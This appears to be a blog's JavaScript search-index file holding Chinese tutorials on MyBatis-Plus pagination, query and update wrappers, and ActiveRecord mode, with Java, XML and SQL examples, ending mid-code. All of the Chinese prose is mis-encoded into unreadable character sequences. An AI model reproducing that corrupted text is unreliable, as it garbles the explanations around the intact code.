"use strict";var tipuesearch={pages:[{title:"MyBatis-Plus å…¥é—¨æ•™ç¨‹ä¹‹å››",url:"/posts/315d5197.html",text:'å‰è¨€ç‰ˆæœ¬è¯´æ˜æœ¬æ–‡çš„æ•™ç¨‹å†…å®¹æ˜¯åŸºäº MyBatis-Plus 3.x ç‰ˆæœ¬è®²è§£çš„ï¼Œè‹¥ä½ ä½¿ç”¨çš„æ˜¯ 2.x æˆ–å…¶ä»–ç‰ˆæœ¬ï¼Œå¯èƒ½ä¼šæœ‰éƒ¨åˆ†çŸ¥è¯†ç‚¹å’Œæ¡ˆä¾‹ä»£ç ä¸å…¼å®¹ã€‚ MyBatis-Plus å®ç”¨åœºæ™¯MyBatis-Plus åˆ†é¡µæ’ä»¶åˆ†é¡µæ’ä»¶ä»‹ç»PaginationInnerInterceptor åˆ†é¡µæ‹¦æˆªå™¨ç±»çš„å±æ€§è¯´æ˜å¦‚ä¸‹ï¼š å±æ€§å ç±»å‹ é»˜è®¤å€¼ æè¿° overflow boolean false æº¢å‡ºæ€»é¡µæ•°åæ˜¯å¦è¿›è¡Œå¤„ç† (é»˜è®¤ä¸å¤„ç†ï¼Œå‚è§ æ’ä»¶#continuePage æ–¹æ³•) maxLimit Long å•é¡µåˆ†é¡µæ¡æ•°é™åˆ¶ (é»˜è®¤æ— é™åˆ¶ï¼Œå‚è§ æ’ä»¶#handlerLimit æ–¹æ³•) dbType DbType æ•°æ®åº“ç±»å‹ (æ ¹æ®ç±»å‹è·å–åº”ä½¿ç”¨çš„åˆ†é¡µæ–¹è¨€ï¼Œå‚è§ æ’ä»¶#findIDialect æ–¹æ³•) dialect IDialect æ–¹è¨€å®ç°ç±» (å‚è§ æ’ä»¶#findIDialect æ–¹æ³•) æç¤º å»ºè®®å•ä¸€æ•°æ®åº“ç±»å‹çš„å‡è®¾ç½® dbType å±æ€§ ç”Ÿæˆ countSql ä¼šåœ¨ left join çš„è¡¨ä¸å‚ä¸ where æ¡ä»¶çš„æƒ…å†µä¸‹ï¼ŒæŠŠ left join ä¼˜åŒ–æ‰ æ‰€ä»¥å»ºè®®ä»»ä½•å¸¦æœ‰ left join çš„ SQLï¼Œéƒ½å†™æˆæ ‡å‡† SQLï¼Œå³ç»™äºè¡¨ä¸€ä¸ªåˆ«åï¼Œå­—æ®µä¹Ÿè¦ åˆ«å.å­—æ®µ åˆ†é¡µæ’ä»¶ä½¿ç”¨æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-plus-lesson-07ã€‚ æ·»åŠ é…ç½®ç±» é…ç½®ç±» 1234567891011121314151617181920/** * MyBatis-Plus é…ç½®ç±» */@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { /** * æ·»åŠ  MyBatis-Plus åˆ†é¡µæ’ä»¶ * * @return */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL)); return interceptor; }} å¯åŠ¨ç±» æç¤º ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯èƒ½è¿˜éœ€è¦åœ¨å¯åŠ¨ç±»ä¸Šé€šè¿‡ @ComponentScan æ³¨è§£æ¥æ‰«æä¸Šé¢å®šä¹‰çš„ MybatisPlusConfig é…ç½®ç±»ã€‚ 123456789@SpringBootApplication@ComponentScan("com.clay.mybatis")public class MyBatisPlusApplication { public static void main(String[] args) { SpringApplication.run(MyBatisPlusApplication.class, args); }} åˆ†é¡µæ“ä½œï¼ˆåŸºäº AR æ¨¡å¼ï¼‰MyBatis-Plus åˆ†é¡µæ’ä»¶æ”¯æŒåœ¨ ActiveRecord æ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ã€‚ å®ä½“ç±» 12345678910111213141516public class Employee extends Model&lt;Employee&gt; { private Long id; private String lastName; private String gender; private String email; private Integer age; .... @Override public Serializable pkVal() { return this.id; }} Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Java æµ‹è¯•ä»£ç  123456789101112131415161718192021222324252627282930313233@SpringBootTestpublic class PagePluginTest { /** * åŸºäº ActiveRecord æ¨¡å¼çš„åˆ†é¡µæŸ¥è¯¢ */ @Test public void selectByPageForAR() { // åˆ†é¡µä¿¡æ¯ Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // æŸ¥è¯¢æ¡ä»¶ QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.eq("gender", "1"); // æ‰§è¡Œåˆ†é¡µæŸ¥è¯¢ Employee employee = new Employee(); employee.selectPage(page, wrapper); // è·å–åˆ†é¡µç»“æœ List&lt;Employee&gt; list = page.getRecords(); list.forEach(System.out::println); // è·å–åˆ†é¡µä¿¡æ¯ System.out.println("æ€»é¡µæ•°ï¼š " + page.getPages()); System.out.println("æ€»è®°å½•æ•°ï¼š " + page.getTotal()); System.out.println("å½“å‰çš„é¡µç ï¼š " + page.getCurrent()); System.out.println("æ¯é¡µçš„è®°å½•æ•°ï¼š " + page.getSize()); System.out.println("æ˜¯å¦æœ‰ä¸Šä¸€é¡µï¼š " + page.hasPrevious()); System.out.println("æ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š " + page.hasNext()); }} æ‰§è¡Œä¸Šé¢çš„æµ‹è¯•ä»£ç åï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 123456789101112131415161718192021==&gt; Preparing: SELECT COUNT(*) AS total FROM t_employee WHERE (gender = ?)==&gt; Parameters: 1(String)&lt;== Columns: total&lt;== Row: 4&lt;== Total: 1==&gt; Preparing: SELECT id,email,last_name,gender,age FROM t_employee WHERE (gender = ?) LIMIT ?,?==&gt; Parameters: 1(String), 2(Long), 2(Long)&lt;== Columns: id, email, last_name, gender, age&lt;== Row: 3, jim@gmail.com, Jim, 1, 26&lt;== Row: 4, peter@gmail.com, Peter, 1, 29&lt;== Total: 2Employee [id=3, lastName=Jim, gender=1, email=jim@gmail.com, age=26]Employee [id=4, lastName=Peter, gender=1, email=peter@gmail.com, age=29]æ€»é¡µæ•°ï¼š 2æ€»è®°å½•æ•°ï¼š 4å½“å‰çš„é¡µç ï¼š 2æ¯é¡µçš„è®°å½•æ•°ï¼š 2æ˜¯å¦æœ‰ä¸Šä¸€é¡µï¼š trueæ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š false åˆ†é¡µæ“ä½œï¼ˆåŸºäºé€šç”¨ Mapperï¼‰MyBatis-Plus åˆ†é¡µæ’ä»¶æ”¯æŒé€šç”¨ Mapper çš„ä½¿ç”¨ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ã€‚ Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Java æµ‹è¯•ä»£ç  1234567891011121314151617181920212223242526272829303132333435@SpringBootTestpublic class PagePluginTest { @Autowired private EmployeeMapper empMapper; /** * åŸºäºé€šç”¨ Mapper çš„åˆ†é¡µæŸ¥è¯¢ */ @Test public void selectByPage() { // åˆ†é¡µä¿¡æ¯ Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // æŸ¥è¯¢æ¡ä»¶ QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.eq("gender", "1"); // æ‰§è¡Œåˆ†é¡µæŸ¥è¯¢ empMapper.selectPage(page, wrapper); // è·å–åˆ†é¡µç»“æœ List&lt;Employee&gt; list = page.getRecords(); list.forEach(System.out::println); // è·å–åˆ†é¡µä¿¡æ¯ System.out.println("æ€»é¡µæ•°ï¼š " + page.getPages()); System.out.println("æ€»è®°å½•æ•°ï¼š " + page.getTotal()); System.out.println("å½“å‰çš„é¡µç ï¼š " + page.getCurrent()); System.out.println("æ¯é¡µçš„è®°å½•æ•°ï¼š " + page.getSize()); System.out.println("æ˜¯å¦æœ‰ä¸Šä¸€é¡µï¼š " + page.hasPrevious()); System.out.println("æ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š " + page.hasNext()); }} åˆ†é¡µæ“ä½œï¼ˆåŸºäºè‡ªå®šä¹‰ Mapper æ–¹æ³•ï¼‰MyBatis-Plus åˆ†é¡µæ’ä»¶æ”¯æŒè‡ªå®šä¹‰ Mapper æ–¹æ³•çš„åˆ†é¡µæŸ¥è¯¢ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ã€‚ Mapper æ¥å£ æç¤º 1ã€è‡ªå®šä¹‰ Mapper æ–¹æ³•æ—¶ï¼Œéœ€è¦æŒ‡å®šè¿”å›å€¼çš„ç±»å‹ä¸º IPage æˆ– Listï¼ŒåŒæ—¶æŒ‡å®šå…¶ä¸­çš„ä¸€ä¸ªæ–¹æ³•å‚æ•°çš„ç±»å‹ä¸º IPage 2ã€è‹¥è‡ªå®šä¹‰ Mapper æ–¹æ³•çš„è¿”å›ç±»å‹æ˜¯ IPageï¼Œåˆ™å…¥å‚çš„ IPage ä¸èƒ½ä¸º nullï¼Œå› ä¸ºè¿”å›çš„ IPage ç­‰äºå…¥å‚çš„ IPageï¼›å¦‚æœæƒ³ä¸´æ—¶ä¸åˆ†é¡µï¼Œå¯ä»¥åœ¨åˆå§‹åŒ– IPage æ—¶æŒ‡å®š size å±æ€§ä¸ºå°äºé›¶çš„å€¼å³å¯ 3ã€è‹¥è‡ªå®šä¹‰ Mapper æ–¹æ³•çš„è¿”å›ç±»å‹æ˜¯ Listï¼Œåˆ™å…¥å‚çš„ IPage å¯ä»¥ä¸º nullï¼ˆä¸º null åˆ™è¡¨ç¤ºä¸åˆ†é¡µï¼‰ 4ã€è‹¥åœ¨ SQL æ˜ å°„æ–‡ä»¶ä¸­ï¼Œéœ€è¦ä» page å¯¹è±¡é‡Œå–å€¼ï¼Œå¯ä»¥ä½¿ç”¨ page.å±æ€§å çš„æ–¹å¼æ¥è·å– 12345678910111213141516171819202122232425262728293031package com.clay.mybatis.dao;import java.util.List;import org.apache.ibatis.annotations.Param;import com.baomidou.mybatisplus.core.mapper.BaseMapper;import com.baomidou.mybatisplus.core.metadata.IPage;import com.clay.mybatis.bean.Employee;public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; { /** * ç¬¬ä¸€ç§æ–¹å¼ï¼šæ–¹æ³•çš„è¿”å›å€¼ä¸º IPage ç±»å‹ * * @param page * @param gender * @return */ IPage&lt;Employee&gt; queryByPage(IPage&lt;Employee&gt; page, @Param("gender") String gender); /** * ç¬¬äºŒç§æ–¹å¼ï¼šæ–¹æ³•çš„è¿”å›å€¼ä¸º List ç±»å‹ * * @param page * @param gender * @return */ List&lt;Employee&gt; queryListByPage(IPage&lt;Employee&gt; page, @Param("gender") String gender);} SQL æ˜ å°„æ–‡ä»¶ 123456789101112131415&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="queryByPage" resultType="Employee"&gt; select id, email, last_name as lastName, gender, age from t_employee where gender = #{gender} &lt;/select&gt; &lt;select id="queryListByPage" resultType="Employee"&gt; select id, email, last_name as lastName, gender, age from t_employee where gender = #{gender} &lt;/select&gt;&lt;/mapper&gt; Java æµ‹è¯•ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@SpringBootTestpublic class PagePluginTest { @Autowired private EmployeeMapper empMapper; /** * åŸºäºè‡ªå®šä¹‰ Mapper æ–¹æ³•ï¼ˆè¿”å›å€¼ä¸º IPageï¼‰çš„åˆ†é¡µæŸ¥è¯¢ */ @Test public void queryByPage() { // åˆ†é¡µä¿¡æ¯ Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // æ‰§è¡Œåˆ†é¡µæŸ¥è¯¢ empMapper.queryByPage(page, "1"); // è·å–åˆ†é¡µç»“æœ List&lt;Employee&gt; list = page.getRecords(); list.forEach(System.out::println); // è·å–åˆ†é¡µä¿¡æ¯ System.out.println("æ€»é¡µæ•°ï¼š " + page.getPages()); System.out.println("æ€»è®°å½•æ•°ï¼š " + page.getTotal()); System.out.println("å½“å‰çš„é¡µç ï¼š " + page.getCurrent()); System.out.println("æ¯é¡µçš„è®°å½•æ•°ï¼š " + page.getSize()); System.out.println("æ˜¯å¦æœ‰ä¸Šä¸€é¡µï¼š " + page.hasPrevious()); System.out.println("æ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š " + page.hasNext()); } /** * åŸºäºè‡ªå®šä¹‰ Mapper æ–¹æ³•ï¼ˆè¿”å›å€¼ä¸º Listï¼‰çš„åˆ†é¡µæŸ¥è¯¢ */ @Test public void queryListByPage() { // åˆ†é¡µä¿¡æ¯ Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // æ‰§è¡Œåˆ†é¡µæŸ¥è¯¢ List&lt;Employee&gt; list = empMapper.queryListByPage(page, "1"); list.forEach(System.out::println); // è·å–åˆ†é¡µä¿¡æ¯ System.out.println("æ€»é¡µæ•°ï¼š " + page.getPages()); System.out.println("æ€»è®°å½•æ•°ï¼š " + page.getTotal()); System.out.println("å½“å‰çš„é¡µç ï¼š " + page.getCurrent()); System.out.println("æ¯é¡µçš„è®°å½•æ•°ï¼š " + page.getSize()); System.out.println("æ˜¯å¦æœ‰ä¸Šä¸€é¡µï¼š " + page.hasPrevious()); System.out.println("æ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š " + page.hasNext()); }} MyBatis-Plus ä¹è§‚é”æ’ä»¶ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"MyBatis-Plus å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰",url:"/posts/7d8f3d89.html",text:'å‰è¨€ç‰ˆæœ¬è¯´æ˜æœ¬æ–‡çš„æ•™ç¨‹å†…å®¹æ˜¯åŸºäº MyBatis-Plus 3.x ç‰ˆæœ¬è®²è§£çš„ï¼Œè‹¥ä½ ä½¿ç”¨çš„æ˜¯ 2.x æˆ–å…¶ä»–ç‰ˆæœ¬ï¼Œå¯èƒ½ä¼šæœ‰éƒ¨åˆ†çŸ¥è¯†ç‚¹å’Œæ¡ˆä¾‹ä»£ç ä¸å…¼å®¹ã€‚ æ¡ä»¶æ„é€ å™¨æç¤º 1ã€MyBatis-Plus æ¡ä»¶æ„é€ å™¨çš„æ¡ä»¶å‚æ•°è¯¦ç»†ä»‹ç»å¯çœ‹ è¿™é‡Œã€‚ 2ã€æœ¬æ–‡æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-plus-lesson-05ã€‚ Wrapper ä»‹ç» Wrapper : æ¡ä»¶æ„é€ æŠ½è±¡ç±»ï¼Œæœ€é¡¶ç«¯çˆ¶ç±» AbstractWrapper : ç”¨äºæŸ¥è¯¢æ¡ä»¶å°è£…ï¼Œç”Ÿæˆ sql çš„ where æ¡ä»¶ QueryWrapper : æŸ¥è¯¢æ¡ä»¶å°è£… UpdateWrapper : Update æ¡ä»¶å°è£… AbstractLambdaWrapper : ä½¿ç”¨ Lambda è¯­æ³• LambdaQueryWrapper : ç”¨äº Lambda è¯­æ³•ä½¿ç”¨çš„æŸ¥è¯¢ Wrapper LambdaUpdateWrapper : Lambda æ›´æ–°å°è£… Wrapper QueryWrapperç»„è£…æŸ¥è¯¢æ¡ä»¶1234567891011121314151617181920@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æŸ¥è¯¢æ¡ä»¶ */ @Test public void selectList() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.like("last_name", \'i\'); wrapper.isNotNull("email"); wrapper.between("age", 20, 25); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND email IS NOT NULL AND age BETWEEN ? AND ?) ç»„è£…æ’åºæ¡ä»¶12345678910111213141516171819@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æ’åºæ¡ä»¶ */ @Test public void orderBy() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.orderByDesc("age"); wrapper.orderByAsc("last_name"); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee ORDER BY age DESC,last_name ASC ç»„è£…åˆ é™¤æ¡ä»¶123456789101112131415161718@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…åˆ é™¤æ¡ä»¶ */ @Test public void delete() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.isNull("email"); Integer deleteResult = empMapper.delete(wrapper); System.out.println("deleteResult: " + deleteResult); }} 1DELETE FROM t_employee WHERE (email IS NULL) ç»„è£…æ›´æ–°æ¡ä»¶1234567891011121314151617181920@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æ›´æ–°æ¡ä»¶ */ @Test public void update() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.ge("age", 26); Employee employee = new Employee(); employee.setLastName("Jim"); Integer updateResult = empMapper.update(employee, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET last_name=? WHERE (age &gt;= ?) æ¡ä»¶çš„ä¼˜å…ˆçº§æç¤º å½“å­˜åœ¨å¤šä¸ªæ¡ä»¶æ—¶ï¼ŒLambda è¡¨è¾¾å¼ä¸­çš„æ¡ä»¶ä¼˜å…ˆæ‰§è¡Œã€‚ 123456789101112131415161718192021@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * æ¡ä»¶çš„ä¼˜å…ˆçº§ */ @Test public void conditionOrder() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); // Lambda è¡¨è¾¾å¼ä¸­çš„æ¡ä»¶ä¼˜å…ˆæ‰§è¡Œï¼Œè¿™é‡Œæ›´æ”¹å§“åä¸­åŒ…å«aå¹¶ä¸”ï¼ˆå¹´é¾„å¤§äº26æˆ–é‚®ç®±ä¸ºNullï¼‰çš„å‘˜å·¥ä¿¡æ¯ wrapper.like("last_name", "a").and(i -&gt; i.gt("age", 26).or().isNull("email")); Employee employee = new Employee(); employee.setLastName("Albert"); Integer updateResult = empMapper.update(employee, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET last_name=? WHERE (last_name LIKE ? AND (age &gt; ? OR email IS NULL)) ç»„è£… Select è¯­å¥12345678910111213141516171819@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£… Select è¯­å¥ */ @Test public void selectColumns() { // æŸ¥è¯¢æŒ‡å®šçš„åˆ— QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.select("last_name", "gender"); List&lt;Map&lt;String, Object&gt;&gt; list = empMapper.selectMaps(wrapper); list.forEach(System.out::println); }} 1SELECT last_name,gender FROM t_employee ç»„è£…åµŒå¥—å­æŸ¥è¯¢123456789101112131415161718@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…åµŒå¥—å­æŸ¥è¯¢ */ @Test public void nestedSubSelect() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.inSql("id", "select id from t_employee where age &lt;= 28"); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (id IN (select id from t_employee where age &lt;= 28)) Condition ç»„è£…æ¡ä»¶123456789101112131415161718192021222324@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * Condition ç»„è£…æ¡ä»¶ */ @Test public void condition() { Integer minAge = 25; Integer maxAge = null; String lastName = "j"; QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); // å½“ Condition æ¡ä»¶æˆç«‹æ—¶ï¼Œæ‰ä¼šæ‹¼æ¥ SQL è¯­å¥ wrapper.like(StringUtils.isNotBlank(lastName), "last_name", lastName); wrapper.ge(minAge != null, "age", minAge); wrapper.le(maxAge != null, "age", maxAge); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND age &gt;= ?) UpdateWrapperç»„è£…æ›´æ–°æ¡ä»¶1234567891011121314151617181920212223@SpringBootTestpublic class UpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æ›´æ–°æ¡ä»¶ */ @Test public void update() { UpdateWrapper&lt;Employee&gt; wrapper = new UpdateWrapper&lt;&gt;(); // æ›´æ–°çš„æ¡ä»¶ wrapper.like("last_name", "a"); wrapper.gt("age", 27); // æ›´æ–°çš„å­—æ®µ wrapper.set("gender", "1"); wrapper.set("email", null); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET gender=?,email=? WHERE (last_name LIKE ? AND age &gt; ?) ç»„è£…æ›´æ–° SQL è¯­å¥12345678910111213141516171819202122@SpringBootTestpublic class UpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æ›´æ–° SQL è¯­å¥ */ @Test public void updateSql() { UpdateWrapper&lt;Employee&gt; wrapper = new UpdateWrapper&lt;&gt;(); // æ›´æ–°çš„æ¡ä»¶ wrapper.like("last_name", "a"); wrapper.gt("age", 27); // æ›´æ–°çš„ SQL è¯­å¥ wrapper.setSql("gender = \'1\' and email = null"); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET gender = \'1\' and email = null WHERE (last_name LIKE ? AND age &gt; ?) LambdaQueryWrapperå€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½¿ç”¨ LambdaQueryWrapper çš„å¥½å¤„æ˜¯å¯ä»¥é˜²æ­¢è¡¨å­—æ®µçš„åç§°è¢«æ‹¼æ¥é”™ã€‚ ç»„è£…æŸ¥è¯¢æ¡ä»¶1234567891011121314151617181920@SpringBootTestpublic class LambdaQueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æŸ¥è¯¢æ¡ä»¶ */ @Test public void selectList() { LambdaQueryWrapper&lt;Employee&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.like(Employee::getLastName, \'j\') .le(Employee::getAge, 28) .eq(Employee::getGender, "1"); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND age &lt;= ? AND gender = ?) Condition ç»„è£…æ¡ä»¶123456789101112131415161718192021222324@SpringBootTestpublic class LambdaQueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * Condition ç»„è£…æ¡ä»¶ */ @Test public void condition() { Integer minAge = 25; Integer maxAge = null; String lastName = "j"; LambdaQueryWrapper&lt;Employee&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); // å½“ Condition æ¡ä»¶æˆç«‹æ—¶ï¼Œæ‰ä¼šæ‹¼æ¥ SQL è¯­å¥ wrapper.like(StringUtils.isNotBlank(lastName), Employee::getLastName, lastName) .ge(minAge != null, Employee::getAge, minAge) .le(maxAge != null, Employee::getAge, maxAge); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND age &gt;= ?) LambdaUpdateWrapperå€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½¿ç”¨ LambdaUpdateWrapper çš„å¥½å¤„æ˜¯å¯ä»¥é˜²æ­¢è¡¨å­—æ®µçš„åç§°è¢«æ‹¼æ¥é”™ã€‚ ç»„è£…æ›´æ–°æ¡ä»¶123456789101112131415161718192021@SpringBootTestpublic class LambdaUpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æ›´æ–°æ¡ä»¶ */ @Test public void update() { LambdaUpdateWrapper&lt;Employee&gt; wrapper = new LambdaUpdateWrapper&lt;&gt;(); wrapper.like(Employee::getLastName, "a") .gt(Employee::getAge, 27) .set(Employee::getGender, "1") .set(Employee::getEmail, null); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); } } 1UPDATE t_employee SET gender=?,email=? WHERE (last_name LIKE ? AND age &gt; ?) ç»„è£…æ›´æ–° SQL è¯­å¥1234567891011121314151617181920@SpringBootTestpublic class LambdaUpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * ç»„è£…æ›´æ–° SQL è¯­å¥ */ @Test public void updateSql() { LambdaUpdateWrapper&lt;Employee&gt; wrapper = new LambdaUpdateWrapper&lt;&gt;(); wrapper.like(Employee::getLastName, "a") .gt(Employee::getAge, 27) .setSql("gender = \'1\' and email = null"); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); } } 1UPDATE t_employee SET gender = \'1\' and email = null WHERE (last_name LIKE ? AND age &gt; ?) ActiveRecord æ¨¡å¼Active Recordï¼ˆæ´»åŠ¨è®°å½•ï¼‰æ˜¯ä¸€ç§é¢†åŸŸæ¨¡å‹æ¨¡å¼ï¼Œç®€ç§° AR æ¨¡å¼ï¼›ç‰¹ç‚¹æ˜¯ä¸€ä¸ªæ¨¡å‹ç±»å¯¹åº”å…³ç³»å‹æ•°æ®åº“ä¸­çš„ä¸€ä¸ªè¡¨ï¼Œè€Œæ¨¡å‹ç±»çš„ä¸€ä¸ªå®ä¾‹å¯¹åº”è¡¨ä¸­çš„ä¸€è¡Œè®°å½•ã€‚ActiveRecord ä¸€ç›´å¹¿å—åŠ¨æ€è¯­è¨€ï¼ˆPHP ã€ Ruby ç­‰ï¼‰çš„å–œçˆ±ï¼Œè€Œ Java ä½œä¸ºå‡†é™æ€è¯­è¨€ï¼Œå¯¹äº ActiveRecord å¾€å¾€åªèƒ½æ„Ÿå¹å…¶ä¼˜é›…ï¼Œæ‰€ä»¥ MyBatis-Plus ä¹Ÿåœ¨ ActiveRecord é“è·¯ä¸Šè¿›è¡Œäº†ä¸€å®šçš„æ¢ç´¢ã€‚ ä½¿ç”¨ ActiveRecord æ¨¡å¼ä½¿ç”¨ ActiveRecord æ¨¡å¼æ—¶ï¼Œä»…ä»…éœ€è¦è®©å®ä½“ç±»ç»§æ‰¿ Model ç±»ï¼Œå¹¶å®ç°æŒ‡å®šä¸»é”®çš„ pkVal() æ–¹æ³•å³å¯ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœä¸»é”®å±æ€§çš„åç§°æœ¬æ¥å°±æ˜¯ idï¼Œåˆ™å¯ä»¥å¿½ç•¥å®ç° pkVal() æ–¹æ³•ã€‚ å®ä½“ç±» 12345678910111213141516public class Employee extends Model&lt;Employee&gt; { private Long id; private String lastName; private String gender; private String email; private Integer age; .... @Override public Serializable pkVal() { return this.id; }} ç‰¹åˆ«æ³¨æ„ å¿…é¡»å­˜åœ¨å¯¹åº”çš„åŸå§‹ Mapper æ¥å£ï¼Œå¹¶ç»§æ‰¿ BaseMapper æ¥å£ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰çš„å‰æä¸‹æ‰èƒ½ä½¿ç”¨ ActiveRecord æ¨¡å¼ï¼ Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} ActiveRecord æ¨¡å¼æ“ä½œç”±äº Model ç±»æä¾›äº†é€šç”¨çš„ CRUD æ–¹æ³•ï¼Œå› æ­¤å®ä½“ç±»ç»§æ‰¿ Model ç±»ä¹‹åï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œ CRUD æ“ä½œã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-plus-lesson-06ã€‚ æŸ¥è¯¢æ•°æ®æ“ä½œ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849@SpringBootTestpublic class ActiveRecordTest { /** * æ ¹æ®IDæŸ¥è¯¢æ•°æ® */ @Test public void selectById() { Employee employee = new Employee(); employee.setId(1L); Employee result = employee.selectById(); System.out.println(result); } /** * æŸ¥è¯¢æ‰€æœ‰æ•°æ® */ @Test public void selectAll() { Employee employee = new Employee(); List&lt;Employee&gt; list = employee.selectAll(); list.forEach(System.out::println); } /** * æ ¹æ®æ¡ä»¶æŸ¥è¯¢æ•°æ® */ @Test public void selectByWrapper() { QueryWrapper&lt;Employee&gt; wrapper = new 